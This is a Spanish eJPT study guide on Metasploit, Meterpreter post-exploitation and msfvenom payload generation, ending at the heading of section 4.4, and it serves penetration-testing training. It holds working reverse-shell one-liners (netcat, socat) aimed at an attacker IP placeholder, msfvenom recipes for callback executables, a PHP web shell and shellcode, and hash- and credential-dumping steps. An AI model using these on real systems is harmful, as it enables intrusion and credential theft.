# 🛡️ GUÍA COMPLETA DE METASPLOIT, SHELLS, OYENTES Y GENERACIÓN DE PAYLOADS
### *Manual Extensivo y Guía de Referencia Técnica – Certificación eJPT*

---

> **Estructura del Manual:** Organizado exactamente en orden cronológico según las 6 fuentes de Notion seleccionadas. Cada sección principal corresponde a un módulo y contiene explicaciones conceptuales exhaustivas, arquitecturas, comandos, banderas, desgloses paso a paso, ejemplos prácticos, técnicas de evasión y métodos de estabilización. La redacción es fluida y narrativa en texto corrido, sin viñetas fuera de bloques de código o tablas, ideal para consultar durante exámenes y auditorías de seguridad.

---

## 🚀 Matriz de Consulta Rápida (Cheat Sheet de Metasploit, Shells y Oyentes)

| Categoría / Herramienta | Comando / Sintaxis Principal | Propósito / Indicador de Éxito |
| :--- | :--- | :--- |
| **Inicio y BD Metasploit** | `sudo msfdb init && msfconsole` | Inicializa PostgreSQL y lanza la consola conectada a la base de datos. |
| **Búsqueda Filtrada** | `search type:exploit platform:windows cve:2017` | Filtra módulos específicos por categoría, sistema operativo y CVE. |
| **Configuración Básica** | `use <módulo>` \| `setg RHOSTS <IP>` \| `set LHOST <IP>` | Selecciona el módulo y fija parámetros globales o locales de conexión. |
| **Oyente Universal MSF** | `use exploit/multi/handler` \| `set PAYLOAD ...` \| `run -j` | Captura conexiones entrantes de payloads escenificados o sin etapas en segundo plano. |
| **Generación Msfvenom EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o s.exe` | Genera un ejecutable sin etapas independiente para Windows de 64 bits. |
| **Generación Msfvenom ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o s.elf` | Genera un binario independiente ejecutable para sistemas Linux. |
| **Web Shell PHP** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o s.php` | Genera una carga útil web para servidores PHP (verificar etiqueta `<?php`). |
| **Oyente Netcat Básico** | `nc -lvnp 4444` | Inicia un oyente TCP en el puerto 4444 para capturar reverse shells simples. |
| **Reverse Shell Netcat** | `nc <IP_ATACANTE> 4444 -e /bin/bash` | Conecta el objetivo de vuelta al oyente ejecutando una consola interactiva. |
| **Oyente Socat TTY** | `socat FILE:`tty`,raw,echo=0 TCP-L:4444` | Oyente avanzado de Socat listo para recibir un pseudoterminal TTY completo. |
| **Reverse Shell Socat TTY** | `socat TCP:<IP>:4444 EXEC:"bash -li",pty,stderr,setsid,sigint,sane` | Envía una shell TTY totalmente interactiva con manejo de Ctrl+C y señales. |
| **Certificado Cifrado SSL** | `openssl req -newkey rsa:2048 -nodes -keyout s.key -x509 -days 365 -out s.crt && cat s.key s.crt > s.pem` | Genera un certificado PEM autofirmado para envolver tráfico de shell en TLS. |
| **Oyente Cifrado Socat** | `socat OPENSSL-LISTEN:443,cert=s.pem,verify=0 -` | Inicia un oyente cifrado SSL/TLS indetectable para inspección de tráfico plano. |
| **Estabilización Python TTY** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Eleva un shell Netcat plano a un pseudoterminal interactivo. |

---

## 1. Metasploit: Los Fundamentos (Metasploit: The Basics)

### 1.1. Introducción al Metasploit Framework
El Metasploit Framework representa el entorno de explotación de código abierto más utilizado en la industria de la ciberseguridad y las pruebas de penetración. Creado originalmente por H. D. Moore en el año 2003 como una herramienta portátil en Perl y posteriormente reescrito en Ruby, el proyecto fue adquirido por Rapid7 en 2009. Desde entonces, ha evolucionado hasta convertirse en un ecosistema masivo que alberga miles de módulos de explotación, escáneres auxiliares, cargas útiles y herramientas de post-explotación.

Para comprender la utilidad de Metasploit en un escenario real, conviene utilizar la analogía de un taller mecánico profesional. Un especialista no intenta construir sus herramientas desde cero cada vez que debe reparar un vehículo, sino que recurre a un panel organizado donde cada llave, alicate o diagnóstico computarizado se encuentra ubicado en su lugar correspondiente. De la misma manera, durante un compromiso con tiempo limitado, un pentester necesita un marco estructurado que organice exploits conocidos, los vincule con las cargas útiles adecuadas y proporcione una interfaz unificada para configurar y lanzar ataques contra la infraestructura objetivo.

Metasploit cubre la totalidad del ciclo de vida de una auditoría de seguridad, dividiéndose en fases clave que abarcan la recopilación de información y escaneo de servicios, la identificación y comprobación de vulnerabilidades, la explotación o entrega del código malicioso, la post-explotación para mantener el acceso y recolectar credenciales, y la generación de registros detallados para la elaboración del informe final.

Existen dos ediciones principales del software. Por un lado, Metasploit Pro es la versión comercial con licencia mantenida por Rapid7, la cual incluye una interfaz gráfica de usuario (GUI), flujos de trabajo automatizados, herramientas de colaboración en equipo y generadores automáticos de informes. Por otro lado, Metasploit Framework es la versión de código abierto impulsada por la comunidad que se ejecuta íntegramente desde la línea de comandos. Esta última es la versión incluida por defecto en distribuciones como Kali Linux o Parrot OS, y todas las técnicas aprendidas en ella son directamente aplicables a la versión comercial, ya que los módulos y comandos subyacentes son idénticos.

El marco se sostiene conceptualmente sobre tres pilares fundamentales:
`msfconsole`: Es la interfaz de línea de comandos central desde la cual se gestionan todas las operaciones. Funciona como la cabina de mando desde la que se buscan módulos, se configuran parámetros, se ejecutan ataques y se administran las sesiones activas.
`Módulos`: Son los bloques de construcción individuales del marco. Cada módulo es un archivo de código independiente diseñado para realizar una tarea específica, ya sea escanear un puerto, explotar un fallo o volcar contraseñas de la memoria.
`Herramientas independendientes`: Son utilidades complementarias que se ejecutan fuera de la consola principal. La más destacada es `msfvenom`, utilizada para la generación independiente de cargas útiles ejecutables, web shells o código de shell sin procesar.

### 1.2. Conceptos Clave y la Cadena de Explotación
Dentro del ámbito de la seguridad informática existen tres términos que se utilizan constantemente y cuya distinción precisa es indispensable para cualquier auditor:
`Vulnerabilidad`: Es un defecto de diseño, una falla de programación o una mala configuración en un sistema objetivo. La vulnerabilidad por sí sola no causa un daño directo, sino que crea la oportunidad o la puerta de entrada para que ocurra un impacto no deseado.
`Exploit`: Es el fragmento de código o la secuencia de comandos diseñada para aprovechar una vulnerabilidad específica. El exploit es el mecanismo de ataque que desencadena el fallo en el servicio de manera controlada.
`Payload` (Carga Útil): Es el código ejecutable que se entrega y ejecuta en el sistema objetivo una vez que el exploit ha tenido éxito. Mientras que el exploit abre la brecha, la carga útil es lo que actúa en el interior, ya sea abriendo una consola remota, creando una cuenta de usuario o ejecutando comandos.

Esta cadena de tres partes es indivisible. Un exploit sin carga útil puede provocar la caída de un servicio, pero no otorga control al atacante. Una carga útil sin un exploit carece de un medio para alcanzar e inyectarse en la memoria de la víctima.

Metasploit clasifica toda su biblioteca en siete categorías de módulos principales:
`Exploits`: Módulos diseñados para aprovechar vulnerabilidades específicas en aplicaciones o sistemas operativos.
`Auxiliary`: Módulos que realizan tareas que no implican la entrega directa de una carga útil, como escáneres de puertos, detectores de versiones, módulos de fuerza bruta, fuzzers y analizadores de tráfico.
`Payloads`: Módulos de código que se ejecutan en la víctima tras una explotación exitosa.
`Post`: Módulos de post-explotación que se ejecutan sobre una sesión ya establecida para recolectar información, escalar privilegios o pivotar.
`Encoders`: Módulos que transforman el código de la carga útil para eliminar caracteres prohibidos o modificar su estructura de bytes.
`NOPs`: Módulos que generan secuencias de instrucciones de no operación (como `0x90` en x86) utilizadas como relleno en ataques de desbordamiento de búfer.
`Evasion`: Módulos diseñados específicamente para generar ejecutables que eludan controles de seguridad como antivirus o EDRs.

Dentro de la categoría de cargas útiles, Metasploit distingue tres tipos según su arquitectura de entrega:
`Singles` (o Cargas Útiles Inline / Sin Etapas): Son archivos autónomos donde todo el código necesario está empaquetado en un solo bloque. Se ejecutan en un único paso, siendo altamente fiables porque no dependen de descargas de red posteriores.
`Stagers`: Son cargas útiles muy pequeñas cuyo único propósito es establecer una conexión inicial de red entre la víctima y el atacante para descargar el componente principal.
`Stages`: Son los bloques de código más grandes y complejos (como la carga útil completa de Meterpreter) que el stager descarga e inyecta directamente en la memoria RAM del objetivo.

La convención de nomenclatura de Metasploit permite identificar de inmediato si una carga útil es sin etapas o por etapas analizando la sintaxis del nombre. Si el tipo de shell y el método de conexión están separados por un guión bajo (`_`), como en `windows/x64/shell_reverse_tcp`, se trata de una carga útil **sin etapas (singles/inline)**. Si están separados por una barra diagonal (`/`), como en `windows/x64/shell/reverse_tcp`, se trata de una carga útil **por etapas (staged)**.

### 1.3. Navegación por Msfconsole
La consola interactiva `msfconsole` se inicia ejecutando el comando `msfconsole` en la terminal de Linux. Tras unos segundos de carga, la interfaz presenta un banner en arte ASCII junto con el recuento actualizado de módulos disponibles y cambia el indicador de la consola a `msf6 >`.

Desde el interior de `msfconsole` es posible ejecutar comandos nativos del sistema operativo Linux como `ip a`, `whoami` o `pwd`, ya que la consola los redirige automáticamente al shell subyacente. Sin embargo, no se admiten redirecciones de flujo mediante tuberías o símbolos como `>` o `>>`. Para guardar la salida de la consola en un archivo de texto, se debe utilizar el comando interno `spool nombre_archivo.txt`.

El sistema de ayuda se invoca mediante el comando `help` o `?`, y se puede consultar la sintaxis específica de cualquier comando escribiendo `help comando`. La consola cuenta con historial de comandos accesible con las flechas del teclado y autocompletado inteligente mediante la tecla Tabulación.

Para localizar módulos dentro de la base de datos se utiliza el comando `search`. Se pueden aplicar filtros combinados para refinar los resultados:
`type:` Filtra por categoría de módulo (`exploit`, `auxiliary`, `post`, `payload`).
`platform:` Filtra por sistema operativo objetivo (`windows`, `linux`, `php`, `python`).
`cve:` Busca por el año y número de identificación CVE específico.
`name:` Coincide con términos presentes en el nombre del módulo.

Cada exploit devuelto en una búsqueda incluye una clasificación de fiabilidad (*Exploit Ranking*):
`Excellent`: El exploit no provoca la caída del servicio bajo ninguna circunstancia (típico en inyecciones SQL o RCEs de aplicación web).
`Great`: El exploit cuenta con autodetector de configuración y funciona de forma consistente en la mayoría de entornos.
`Good`: El exploit dispone de una configuración predeterminada adecuada pero no detecta el entorno automáticamente.
`Normal`: El exploit es fiable pero solo para una versión muy específica del objetivo.
`Average`: El exploit es inestable pero su tasa de éxito supera el 50 por ciento.
`Low`: El exploit tiene una tasa de éxito inferior al 50 por ciento.
`Manual`: El exploit es esencialmente una denegación de servicio o requiere una configuración manual compleja.

Para inspeccionar los detalles técnicos de un módulo se utiliza el comando `info nombre_modulo` o `info numero_indice`. La salida detalla los autores del módulo, la lista de opciones requeridas, si la explotación otorga privilegios elevados (`Privileged: yes`), si soporta comprobación previa no destructiva (`Check supported: yes`) y los objetivos de sistema operativo compatibles.

### 1.4. Configuración y Ejecución de Módulos
El trabajo en Metasploit se realiza en función del contexto del indicador de comandos. Existen cinco entornos principales:
`root@kali:~#`: Terminal estándar de Linux donde no se está ejecutando Metasploit.
`msf6 >`: Consola de Metasploit global sin ningún módulo seleccionado.
`msf6 exploit(windows/smb/ms17_010_eternalblue) >`: Contexto de módulo activo donde se aplican comandos de configuración y ejecución.
`meterpreter >`: Sesión interactiva de post-explotación sobre la máquina víctima.
`C:\Windows\system32>`: Shell de comandos nativo del sistema operativo objetivo.

Para seleccionar un módulo se utiliza el comando `use nombre_modulo` o `use numero_indice`. Para salir del módulo actual y regresar al prompt global se utiliza el comando `back`.

Una vez cargado un módulo, el comando `show options` muestra los parámetros configurables divididos en tres secciones: las opciones propias del exploit, las opciones de la carga útil seleccionada y los objetivos de explotación (*Targets*).

Los seis parámetros universales más importantes son:
`RHOSTS`: Dirección IP, rango CIDR o archivo de texto con las IPs del objetivo remoto.
`RPORT`: Puerto remoto en el que escucha el servicio vulnerable.
`LHOST`: Dirección IP de la máquina atacante a la que volverá la conexión inversa.
`LPORT`: Puerto local de la máquina atacante que recibirá la conexión (por defecto 4444).
`PAYLOAD`: Carga útil seleccionada para ser entregada tras la explotación.
`SESSION`: Identificador numérico de sesión utilizado en módulos de post-explotación.

Asignación de parámetros:
Para fijar un parámetro dentro del módulo actual se utiliza `set PARAMETRO valor`.
Para fijar un parámetro de forma global para todos los módulos de la sesión de msfconsole se utiliza `setg PARAMETRO valor`.
Para borrar un parámetro local se utiliza `unset PARAMETRO` y para borrar un parámetro global `unsetg PARAMETRO`.
Para listar todas las cargas útiles compatibles con el módulo activo se escribe `show payloads`.

Para lanzar el módulo se puede ejecutar tanto el comando `exploit` como `run`. Si se añade la bandera `-z`, el exploit se ejecutará y, si obtiene acceso, enviará la sesión inmediatamente al segundo plano sin cambiar la pantalla del usuario. Si el módulo lo soporta, el comando `check` permite validar si el objetivo es vulnerable sin enviar la carga útil destructiva.

### 1.5. Gestión de Sesiones
Una sesión es un canal de comunicación activo y persistente establecido entre la máquina atacante y el sistema comprometido. Las sesiones pueden ser de tipo Meterpreter, shells de comandos estándar (`cmd.exe` o `/bin/bash`) o sesiones de protocolo interactivo (SMB, MSSQL, MySQL).

Cuando se está interactuando dentro de una sesión activa, se puede enviar a segundo plano sin interrumpir la conexión mediante el comando `background` o la combinación de teclas `Ctrl + Z`.

Comandos de gestión de sesiones:
`sessions`: Lista todas las sesiones activas detallando su ID, tipo, usuario, nombre de host y par de IPs/puertos de conexión.
`sessions -i ID`: Reanuda la interacción con la sesión especificada por su número de ID.
`sessions -n Nombre -i ID`: Asigna un nombre personalizado a la sesión para facilitar su identificación.
`sessions -k ID`: Termina y cierra la sesión especificada.
`sessions -K`: Termina y cierra todas las sesiones activas en el marco de forma simultánea.

---

## 2. Metasploit: Escaneo y Explotación (Metasploit: Scanning and Exploitation)

### 2.1. Escaneo con Módulos de Metasploit y Nmap
El reconocimiento dentro de Metasploit permite recopilar información de puertos y servicios abiertos de manera que los hallazgos alimenten directamente la base de datos interna.

El marco incluye módulos auxiliares de escaneo de puertos ubicados en `auxiliary/scanner/portscan/`. El módulo más utilizado es `auxiliary/scanner/portscan/tcp`, el cual realiza un escaneo de conexión TCP completa. A diferencia de Nmap (que escanea los 1.000 puertos más comunes por defecto), el módulo de Metasploit escanea por defecto el rango secuencial `1-10000`. Se pueden ajustar los parámetros `PORTS` para limitar el rango, `THREADS` para aumentar los hilos concurrentes y `CONCURRENCY` para ajustar la velocidad por host.

Además de los escáneres de puertos genéricos, Metasploit dispone de escáneres específicos para protocolos:
`auxiliary/scanner/netbios/nbname`: Consulta el servicio de nombres NetBIOS para obtener el nombre de host y el dominio.
`auxiliary/scanner/http/http_version`: Realiza la huella digital del servidor web e identifica versiones de software.
`auxiliary/scanner/smb/smb_login`: Realiza pruebas de fuerza bruta de credenciales sobre el servicio SMB.

También es posible ejecutar el comando Nmap nativo directamente desde el prompt `msf6 >` escribiendo `nmap -sV IP`. Sin embargo, las ejecuciones directas de Nmap no guardan los resultados en la base de datos de Metasploit a menos que se utilice el comando integrado `db_nmap`.

### 2.2. La Base de Datos de Metasploit
Metasploit utiliza una base de datos PostgreSQL para almacenar de forma estructurada los hosts descubiertos, puertos abiertos, servicios, credenciales obtenidas y vulnerabilidades confirmadas.

En distribuciones Kali Linux, la inicialización de la base de datos se realiza en la terminal del sistema mediante el comando `sudo msfdb init`. Posteriormente, dentro de `msfconsole`, se verifica el estado de la conexión con `db_status`.

Para aislar los datos de diferentes proyectos o auditorías se utilizan los Espacios de Trabajo (*Workspaces*):
`workspace`: Lista todos los espacios de trabajo existentes y muestra con un asterisco (`*`) el activo.
`workspace -a Nombre`: Crea un nuevo espacio de trabajo y se cambia a él.
`workspace Nombre`: Cambia al espacio de trabajo especificado.
`workspace -d Nombre`: Elimina un espacio de trabajo y todos los datos contenidos en él.

El comando `db_nmap` ejecuta Nmap con cualquier bandera habitual (por ejemplo, `db_nmap -sV -sC -O IP`) e importa automáticamente todas las IPs, puertos, servicios y firmas de sistema operativo a la base de datos activa.

Comandos de consulta de la base de datos:
`hosts`: Muestra la lista de direcciones IP y nombres de host guardados.
`services`: Muestra todos los puertos y servicios descubiertos. Se puede filtrar por servicio con `services -S nombre` y popular automáticamente la opción `RHOSTS` del módulo activo escribiendo `services -S smb -R`.
`creds`: Muestra las credenciales de usuario y contraseña capturadas durante el análisis.
`vulns`: Lista las vulnerabilidades confirmadas en los objetivos con sus correspondientes referencias CVE.
`db_import archivo.xml`: Importa resultados de escaneos realizados previamente en formato XML desde Nmap, Nessus o Qualys.
`db_export -f xml archivo.xml`: Exporta la base de datos actual a un archivo XML para la elaboración de informes.

### 2.3. Escaneo de Vulnerabilidades
La identificación de vulnerabilidades con Metasploit consiste en vincular las versiones de servicio descubiertas durante el escaneo con módulos auxiliares de comprobación específica.

Por ejemplo, si el escaneo detecta un servicio SMB en un sistema Windows Server 2008, se puede cargar el módulo `auxiliary/scanner/smb/smb_ms17_010`. Al ejecutar este módulo contra la IP objetivo, si el sistema carece del parche de seguridad, devolverá la confirmación de que el host es vulnerable a EternalBlue y registrará automáticamente el hallazgo en la tabla `vulns` de la base de datos.

De forma similar, ante un servicio FTP en el puerto 21 que ejecute `vsftpd 2.3.4`, se puede recurrir al módulo `auxiliary/scanner/ftp/anonymous` para verificar si admite inicio de sesión anónimo, o proceder directamente a la verificación de su vulnerabilidad conocida.

### 2.4. Explotación Práctica: EternalBlue vs. vsftpd 2.3.4 Backdoor
Para ilustrar la versatilidad de Metasploit, se comparan dos escenarios de explotación fundamentalmente diferentes:

**Escenario 1: EternalBlue (MS17-010 en Windows)**
Se selecciona el módulo `exploit/windows/smb/ms17_010_eternalblue`. Se configura `RHOSTS` con la IP de la víctima y `LHOST` con la IP del atacante. El marco selecciona automáticamente la carga útil por etapas `windows/x64/meterpreter/reverse_tcp`. Al ejecutar `exploit`, el módulo aprovecha un desbordamiento de búfer en el controlador de memoria de SMBv1 a nivel de kernel, otorga una sesión de Meterpreter con el máximo nivel de privilegio (`NT AUTHORITY\SYSTEM`) y permite extraer los hashes NTLM de la base de datos SAM local mediante el comando `hashdump`.

**Escenario 2: Puerta Trasera vsftpd 2.3.4 (en Linux)**
Se selecciona el módulo `exploit/unix/ftp/vsftpd_234_backdoor`. Se configura `RHOSTS` con la IP del servidor Linux. Este fallo no es un desbordamiento de memoria, sino un código malicioso introducido en el código fuente original del software en 2011 que abre un shell en el puerto 6200 cuando un usuario se conecta e introduce un nombre de usuario que termina en los caracteres `:)`. La carga útil adecuada para esta puerta trasera es `cmd/unix/interact` o `cmd/unix/reverse_bash`. Al ejecutar el exploit, se obtiene un shell de comandos directo con privilegios de `root`.

| Dimensión | EternalBlue (MS17-010) | Puerta Trasera vsftpd 2.3.4 |
| :--- | :--- | :--- |
| **Servicio Objetivo** | SMB (Puerto 445) | FTP (Puerto 21) |
| **Sistema Operativo** | Windows Server 2008 / Windows 7 | Linux (Ubuntu / Debian) |
| **Tipo de Fallo** | Desbordamiento de búfer en kernel SMBv1 | Puerta trasera implantada en código fuente |
| **Exploit Rank** | Average | Excellent |
| **Payload Habitual** | `windows/x64/meterpreter/reverse_tcp` (Staged) | `cmd/unix/interact` (Single) |
| **Tipo de Sesión** | Sesión interactiva de Meterpreter | Shell de comandos en bruto |
| **Privilegios Obtenidos** | `NT AUTHORITY\SYSTEM` | `root` |

---

## 3. Metasploit: Post-Explotación (Metasploit: Post-Exploitation)

### 3.1. Arquitectura y Principios de Diseño de Meterpreter
Meterpreter (abreviatura de *Meta-Interpreter*) es una carga útil avanzada de post-explotación que actúa como agente en una arquitectura de Comando y Control (C2). A diferencia de un shell tradicional que simplemente retransmite entradas y salidas del sistema operativo, Meterpreter proporciona un entorno interactivo completo con comandos dedicados para manipular procesos, extraer credenciales, navegar por el sistema de archivos y pivotar en la red.

Meterpreter se basa en tres principios de diseño fundamentales:
`Ejecución exclusiva en memoria RAM`: Utiliza la técnica de **Inyección Reflectante de DLL** para cargarse directamente en la memoria de un proceso legítimo en ejecución (como `spoolsv.exe` o `svchost.exe`) sin escribir ningún archivo binario en el disco duro. Esto elude los escaneos estáticos de firmas de los antivirus convencionales.
`Comunicación Cifrada`: Todo el tráfico entre Meterpreter y la consola de msfconsole se transmite cifrado mediante TLS (en cargas útiles HTTP/HTTPS) o cifrado simétrico AES (en cargas útiles TCP), evitando la inspección por parte de sistemas IDS/IPS de red.
`Extensibilidad Modular`: Su núcleo inicial es sumamente ligero. Las funcionalidades avanzadas se cargan en la memoria bajo demanda mediante el comando `load` (por ejemplo, `load kiwi`), transfiriendo únicamente el código necesario al objetivo.

### 3.2. Implementaciones de Meterpreter y Selección de Payloads
Meterpreter existe en múltiples variantes según la plataforma del objetivo:
`Windows Meterpreter`: La versión original y más completa basada en DLLs reflectantes.
`Mettle`: Implementación nativa escrita en C para sistemas Linux, macOS, BSD y dispositivos embebidos POSIX.
`Java Meterpreter`: Ejecutado dentro de una Máquina Virtual Java (JVM), ideal para servidores Tomcat o Jenkins.
`PHP Meterpreter`: Ejecutado como código interpretado dentro del motor PHP de un servidor web.
`Python Meterpreter`: Ejecutado como script en entornos que dispongan del intérprete Python.

Para seleccionar la carga útil adecuada se aplica un marco de decisión basado en tres factores:
El primer factor es el **Sistema Operativo Objetivo:** Define la familia de la carga útil (`windows/`, `linux/`, `php/`, `java/`).
El segundo factor comprende los **Componentes Disponibles:** Define el motor de ejecución accesible en la víctima (DLL reflectante nativa, interprete PHP o JVM).
El tercer factor determina el **Tipo de Conexión:**
   `reverse_tcp`: La víctima se conecta a la máquina atacante por TCP. Es el método más rápido y fiable.
   `reverse_https`: La víctima se conecta mediante HTTPS cifrado en el puerto 443, camuflando el tráfico entre peticiones web legítimas.
   `bind_tcp`: Meterpreter abre un puerto de escucha en la víctima y el atacante se conecta a él, útil cuando el cortafuegos de salida de la víctima bloquea todo el tráfico saliente.

### 3.3. Comandos Esenciales de Meterpreter
Una vez obtenida una sesión de Meterpreter, los comandos se agrupan por su función operativa:

**Reconocimiento Situacional:**
`sysinfo`: Muestra el nombre de host, versión del sistema operativo, arquitectura y dominio.
`getuid`: Muestra la cuenta de usuario bajo la que se ejecuta el proceso de Meterpreter.
`getpid`: Muestra el ID del proceso (PID) actual en el que está alojado Meterpreter.
`ps`: Lista todos los procesos activos en el sistema objetivo indicando su PID, PPID, usuario y arquitectura.
`idletime`: Muestra el tiempo en segundos que el usuario remoto lleva sin interactuar con el teclado o ratón.

**Operaciones en el Sistema de Archivos:**
`pwd` / `cd` / `ls`: Navegación habitual por directorios.
`cat archivo`: Muestra el contenido de un archivo de texto en pantalla.
`search -f *.txt -d C:\`: Busca patrones de archivos en una ruta específica o en todo el disco.
`download archivo_remoto`: Descarga un archivo desde la víctima hacia la máquina atacante.
`upload archivo_local`: Sube un archivo desde la máquina atacante hacia la víctima.

**Red y Redes Locales:**
`ifconfig` / `ipconfig`: Muestra las interfaces de red e IPs configuradas en la víctima.
`netstat`: Muestra las conexiones de red activas y puertos en escucha.

**Interacción con el Sistema Operativo:**
`shell`: Abre un shell de comandos nativo (`cmd.exe` o `/bin/bash`) dentro de la sesión.
`execute -f comando.exe -i`: Ejecuta un programa en la víctima de forma interactiva.
`help`: Lista todos los comandos disponibles según la versión y extensiones cargadas.

### 3.4. Técnicas Avanzadas de Post-Explotación
**Migración de Procesos (`migrate PID`):**
Permite mover la sesión de Meterpreter desde el proceso actual inestable (por ejemplo, un navegador que el usuario puede cerrar) a un proceso del sistema de larga duración (como `explorer.exe` o `svchost.exe`). Si se requiere extraer credenciales de la memoria SAM o LSASS, es imprescindible migrar previamente al proceso `lsass.exe` (PID de LSASS). Se debe verificar con `getuid` que la migración no haya reducido los privilegios del usuario.

**Escalada de Privilegios (`getsystem`):**
Aplica técnicas automáticas de suplantación de tuberías con nombre (*Named Pipe Impersonation*) y duplicación de tokens para elevar los privilegios de un usuario Administrador local hacia `NT AUTHORITY\SYSTEM`.

**Extracción de Hashes (`hashdump`):**
Extrae los hashes de contraseñas locales almacenados en la base de datos SAM de Windows. La salida muestra las cuentas en formato `Usuario:RID:LM_Hash:NTLM_Hash:::`. Requiere privilegios de `SYSTEM`.

**Carga de Extensiones (Kiwi / Mimikatz):**
Mediante el comando `load kiwi` se integra la herramienta Mimikatz dentro de la memoria de Meterpreter. Al ejecutar `creds_all`, Kiwi busca contraseñas almacenadas en texto plano en el proveedor WDigest de la memoria RAM. Otros comandos de Kiwi son `lsa_dump_sam` y `lsa_dump_secrets`.

**Ejecución de Módulos Post:**
Los módulos de la categoría `post/` se ejecutan sobre sesiones activas de Meterpreter. El procedimiento consiste en enviar la sesión activa al segundo plano con `background`, seleccionar el módulo post con `use post/windows/gather/enum_domain`, asignar el parámetro `set SESSION ID_SESION` y ejecutar el módulo con `run`.

---

## 4. Metasploit: Generación de Payloads (Metasploit: Payload Generation)

### 4.1. Sintaxis Básica de Msfvenom y Referencia de Banderas
`msfvenom` es la herramienta independiente del marco Metasploit utilizada para generar cargas útiles personalizadas en múltiples formatos sin necesidad de iniciar la consola `msfconsole`.

La sintaxis fundamental de un comando `msfvenom` requiere la selección de la carga útil (`-p`), el formato de salida (`-f`), la ruta del archivo generado (`-o`) y las opciones de conexión pasadas como pares de clave y valor (`LHOST` y `LPORT`):

`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f exe -o payload.exe`

| Banderas de Msfvenom | Propósito y Función Operativa | Ejemplo de Uso |
| :--- | :--- | :--- |
| `-p` | Selecciona la carga útil específica a generar | `-p linux/x64/meterpreter/reverse_tcp` |
| `-f` | Define el formato de salida binario o de transformación | `-f exe`, `-f elf`, `-f raw`, `-f c`, `-f python` |
| `-o` | Especifica la ruta y nombre del archivo de salida | `-o payload.exe` |
| `-e` | Selecciona el codificador para transformar la carga útil | `-e x86/shikata_ga_nai` |
| `-i` | Define el número de iteraciones de codificación | `-i 5` |
| `-b` | Especifica la lista de caracteres prohibidos (*Bad Chars*) | `-b ' 

'` |
| `-x` | Define una plantilla ejecutable legítima para inyección | `-x putty.exe` |
| `-k` | Preserva el hilo de ejecución original de la plantilla | `-k` (se usa en combinación con `-x`) |
| `-a` | Fuerza la arquitectura de procesamiento | `-a x64` o `-a x86` |
| `--platform` | Fuerza la plataforma de sistema operativo | `--platform windows` o `--platform linux` |
| `LHOST=` | Opción de carga útil: Dirección IP del oyente atacante | `LHOST=10.10.14.12` |
| `LPORT=` | Opción de carga útil: Puerto de escucha de la máquina atacante | `LPORT=4444` |

Comandos de consulta de opciones e inventario en msfvenom:
`msfvenom -l payloads`: Lista todas las cargas útiles disponibles en el sistema.
`msfvenom -l formats`: Lista todos los formatos de salida soportados.
`msfvenom -l encoders`: Lista los codificadores disponibles.
`msfvenom -p PAYLOAD --list-options`: Muestra los parámetros obligatorios de una carga útil específica.

### 4.2. Payloads Escenificados (Staged) vs. Sin Etapas (Stageless)
La diferencia entre ambos tipos de cargas útiles radica en el tamaño del archivo inicial generado y la dependencia de red durante la ejecución:

**Cargas Útiles sin Etapas (Stageless / Inline):**
Se identifican con un guión bajo en el nombre, como `windows/x64/meterpreter_reverse_tcp`. El archivo generado incluye la totalidad del agente Meterpreter en un único paquete (tamaño aproximado de 240 KB). Son la opción recomendada para ejecutables independientes lanzados manualmente, ya que funcionan con una sola conexión saliente y no dependen de la estabilidad de la red para descargas posteriores.

**Cargas Útiles por Etapas (Staged):**
Se identifican con una barra diagonal en el nombre, como `windows/x64/meterpreter/reverse_tcp`. El archivo generado contiene únicamente un stager muy pequeño (tamaño aproximado de 7 KB) cuya única función es conectarse al controlador de Metasploit para descargar el resto del agente Meterpreter en la memoria RAM. Son la opción predeterminada en módulos de explotación interna donde el espacio de memoria para inyección es sumamente reducido.

| Factor Operativo | Sin Etapas (Stageless - `_`) | Por Etapas (Staged - `/`) |
| :--- | :--- | :--- |
| **Tamaño del Archivo** | Mayor (incluye la carga útil completa en disco) | Muy pequeño (solo el stager inicial) |
| **Fiabilidad de Red** | Alta (una sola conexión establece la sesión) | Depende de una conexión estable durante la transferencia |
| **Superficie en Disco** | Archivo más grande (fácil firma estática) | Archivo inicial diminuto |
| **Uso Recomendado** | Archivos independientes generados con `msfvenom` | Módulos de explotación directa en `msfconsole` |

### 4.3. Formatos de Salida y Recetas Habituales
Los formatos de salida de `msfvenom` se dividen en dos categorías:
`Formatos Ejecutables`: Producen binarios autónomos ejecutables directamente por el sistema operativo objetivo (`exe`, `elf`, `macho`, `apk`, `war`, `msi`).
`Formatos de Transformación`: Producen estructuras de código de programación destinadas a ser embebidas dentro de un script o exploit personalizado (`raw`, `c`, `csharp`, `python`, `powershell`, `hex`, `base64`).

**Recetas de comandos msfvenom más utilizadas:**

**Ejecutable para Windows (64 bits):**
`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f exe -o reverse.exe`

**Ejecutable para Linux (64 bits):**
`msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f elf -o reverse.elf`

**Web Shell para servidor PHP:**
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f raw -o shell.php`
*(Nota: Se debe verificar tras la generación que el archivo comience correctamente con la etiqueta `<?php` sin comentarios previos).*

**Comando Python de una sola línea (One-Liner):**
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.12 LPORT=4444 -f raw`

**Shellcode C para exploits de desbordamiento de búfer:**
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=4444 -b ' 

' -f c`

| Escenario de Entrega | Payload Recomendado | Formato (`-f`) |
| :--- | :--- | :--- |
| **Ejecutable independiente Windows** | `windows/x64/meterpreter_reverse_tcp` | `exe` |
| **Binario ejecutable Linux** | `linux/x64/meterpreter_reverse_tcp` | `elf` |
| **Subida de archivo en aplicación PHP** | `php/meterpreter_reverse_tcp` | `raw` |
| **Inyección de comando Python** | `cmd/unix/reverse_python` | `raw` |
| **Explotación de Servidor Tomcat / Jenkins** | `java/meterpreter/reverse_tcp` | `war` |
| **Ejecución remota en PowerShell** | `windows/x64/meterpreter_reverse_tcp` | `powershell` |

### 4.4. Codificadores (Encoders) y Mitos de Evasión
